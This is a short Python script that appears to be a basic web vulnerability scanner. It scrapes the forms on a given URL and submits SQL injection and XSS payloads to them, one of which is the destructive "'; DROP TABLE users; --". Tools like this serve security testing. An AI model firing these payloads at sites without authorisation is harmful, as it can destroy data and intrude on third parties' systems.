import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

sql_payloads = ["' OR '1'='1", "'; DROP TABLE users; --"]
xss_payloads = ["<script>alert('XSS')</script>", '"><img src=x onerror=alert(1)>']

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

def get_forms(url):
    soup = BeautifulSoup(requests.get(url, headers=headers).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def test_xss(url):
    print("\nðŸ§ª Testing for XSS...")
    forms = get_forms(url)
    for form in forms:
        details = get_form_details(form)
        for payload in xss_payloads:
            data = {}
            for input in details["inputs"]:
                if input["type"] == "text" or input["type"] == "search":
                    data[input["name"]] = payload
            form_url = urljoin(url, details["action"])
            if details["method"] == "post":
                res = requests.post(form_url, data=data, headers=headers)
            else:
                res = requests.get(form_url, params=data, headers=headers)

            if payload in res.text:
                print(f" Possible XSS vulnerability at: {form_url}")
                break

def test_sqli(url):
    print("\n Testing for SQL Injection...")
    forms = get_forms(url)
    for form in forms:
        details = get_form_details(form)
        for payload in sql_payloads:
            data = {}
            for input in details["inputs"]:
                if input["type"] == "text" or input["type"] == "search":
                    data[input["name"]] = payload
            form_url = urljoin(url, details["action"])
            if details["method"] == "post":
                res = requests.post(form_url, data=data, headers=headers)
            else:
                res = requests.get(form_url, params=data, headers=headers)

            if "error" in res.text.lower() or "sql" in res.text.lower():
                print(f" Possible SQL Injection vulnerability at: {form_url}")
                break

def main():
    url = input("Enter the URL to scan: ").strip()
    if not url.startswith("http"):
        url = "http://" + url
    print(f"\n Scanning: {url}")
    test_sqli(url)
    test_xss(url)

if __name__ == "__main__":
    main()
